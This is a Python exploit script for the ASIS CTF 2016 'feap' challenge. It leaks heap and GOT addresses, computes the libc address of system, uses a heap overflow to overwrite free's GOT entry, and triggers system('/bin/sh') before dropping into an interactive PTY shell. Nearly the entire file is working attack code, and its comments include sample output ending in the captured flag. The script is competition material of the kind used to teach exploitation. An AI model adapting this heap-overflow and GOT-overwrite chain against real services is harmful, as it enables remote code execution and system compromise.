#!/usr/bin/env python
#
# ASIS CTF 2016
# feap
#
# @_hugsy_
#
# $  ./gef-exploit.py                                                                                                                                                                          (13:55)
# [+] Connected to feap.asis-ctf.ir:7331
# [+] Leaking addresses
# [+] notes[0] is at 0x184d010
# [+] free@plt is at 0x7f5b7304fdf0
# [+] memset@plt is at 0x7f5b730595c0
# [+] libc_base is at 0x7f5b72fcd000
# [+] system@libc is at 0x7f5b73013640
# [+] puts@plt is at 0x7f5b7303ce30
# [+] Create 1st note
# [+] Overflowing size of next note via 1st note
# [+] Create 2nd note
# [+] Creating a new chunk to overwrite free@plt
# [+] Deleting 1st note to trigger free@plt(/bin/sh)
# [+] Switching to interactive...
# cat flag
# ASIS{H34P_0V3R_Fl0W_533M5_T0_B3_ST1LL_FR3SH_*}
#

import socket, struct, sys, telnetlib, binascii

HOST = "feap.asis-ctf.ir"
# HOST = "localhost"
PORT = 7331

def hexdump(src, length=0x10):
    f=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)]) ; n=0 ; result=''
    while src:
       s,src = src[:length],src[length:]; hexa = ' '.join(["%02X"%ord(x) for x in s])
       s = s.translate(f) ; result += "%04X   %-*s   %s\n" % (n, length*3, hexa, s); n+=length
    return result

def xor(data, key):  return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, itertools.cycle(key)))

def h_p(i,signed=False): return struct.pack("<H", i) if not signed else struct.pack("<h", i)
def h_u(i,signed=False): return struct.unpack("<H", i)[0] if not signed else struct.unpack("<h", i)[0]
def i_p(i,signed=False): return struct.pack("<I", i) if not signed else struct.pack("<i", i)
def i_u(i,signed=False): return struct.unpack("<I", i)[0] if not signed else struct.unpack("<i", i)[0]
def q_p(i,signed=False): return struct.pack("<Q", i) if not signed else struct.pack("<q", i)
def q_u(i,signed=False): return struct.unpack("<Q", i)[0] if not signed else struct.unpack("<q", i)[0]

def _xlog(x):
    sys.stderr.write(x + "\n")
    sys.stderr.flush()
    return

def err(msg):  _xlog("[!] %s" % msg)
def ok(msg):   _xlog("[+] %s" % msg)
def dbg(msg):  _xlog("[*] %s" % msg)
def xd(msg):   _xlog("[*] Hexdump:\n%s" % hexdump(msg))


def build_socket(host, port):
    s = telnetlib.Telnet(HOST, PORT)
    ok("Connected to %s:%d" % (host, port))
    return s

def interact(s, live_tty=False):
    pty = """python -c "import pty;pty.spawn('/bin/bash')" """
    try:
        if live_tty:  s.write(pty + '\n')
        else:         ok("""Get a PTY with ' %s  '""" % pty)
        s.interact()
    except KeyboardInterrupt:
        ok("Leaving")
    except Exception as e:
        err("Unexpected exception: %s" % e)
    return

def leak_memory(s, addr):
    s.read_until("> ")
    s.write("1\n")
    s.read_until("Enter note body size: ")
    s.write("{}\n".format(addr-64))
    s.read_until(": ")
    s.write("\n")
    s.read_until(": ")
    s.write("\n")

    s.read_until("> ")
    s.write("5\n")
    s.read_until("Please enter note id to print: ")
    s.write("22\n")
    s.read_until("Title: ")
    addr = s.read_until("\n")[:-1]+'\x00'
    addr = addr[::-1]
    addr = '0x'+addr.encode("hex")

    s.read_until("> ")
    s.write("2\n")
    s.read_until("Please enter note id to delete: ")
    s.write("0\n")
    return long(addr, 16)

def pwn(s):
    ok("Leaking addresses")
    notes = 0x6020A8
    notes_addr = leak_memory(s, notes)
    ok("notes[0] is at %#x" % notes_addr)
    free_got = 0x0602018
    free_addr = leak_memory(s, free_got)
    ok("free@plt is at %#x" % free_addr)
    memset_got = 0x602038
    memset_addr = leak_memory(s, memset_got)
    ok("memset@plt is at %#x" % memset_addr)
    libc_base = free_addr - 0x00082df0
    ok("libc_base is at %#x" % libc_base)
    system_addr = libc_base + 0x00046640
    ok("system@libc is at %#x" % system_addr) # from http://libcdb.com/libc/79/symbols?name=__libc_system
    puts_got = 0x602020
    puts_addr = leak_memory(s, puts_got)
    ok("puts@plt is at %#x" % puts_addr)

    ok("Create 1st note")
    s.read_until("> ")
    s.write("1\n")
    s.read_until("Enter note body size: ")
    s.write("2\n")
    s.read_until(": ")
    s.write("/bin/sh\0\n")
    s.read_until(": ")
    s.write("\n")

    ok("Overflowing size of next note via 1st note")
    s.read_until("> ")
    s.write("3\n")
    s.read_until("Please enter note id to edit: ")
    s.write("0\n")
    s.read_until("1 for edit title, 2 for edit body: ")
    s.write("2\n")
    s.read_until("Please enter note body: ")
    s.write("\xff"*16 + "\n")

    sz = free_got - notes_addr - 64 - 448
    ok("Create 2nd note")
    s.read_until("> ")
    s.write("1\n")
    s.read_until("Enter note body size: ")
    s.write("{}\n".format(sz))
    s.read_until(": ")
    s.write("\n")
    s.read_until(": ")
    s.write("\n")

    ok("Creating a new chunk to overwrite free@plt")
    s.read_until("> ")
    s.write("1\n")
    s.read_until("Enter note body size: ")
    s.write("2\n")
    s.read_until(": ")
    s.write("\x00"*8 + q_p(system_addr) + q_p(puts_addr) + "\n")
    s.read_until(": ")
    s.write("1\n")

    ok("Deleting 1st note to trigger free@plt(/bin/sh)")
    s.read_until("> ")
    s.write("2\n")
    s.read_until("Please enter note id to delete: ")
    s.write("0\n")

    # raw_input("end")
    return True

if __name__ == "__main__":
    s = build_socket(HOST, PORT)
    # raw_input("Attach with GDB and hit Enter ")
    if pwn(s):
        ok("Switching to interactive...")
        interact(s, True)
        ret = 0
    else:
        err("Failed to exploit")
        ret = 1

    s.close()
    exit(ret)

# auto-generated by gef
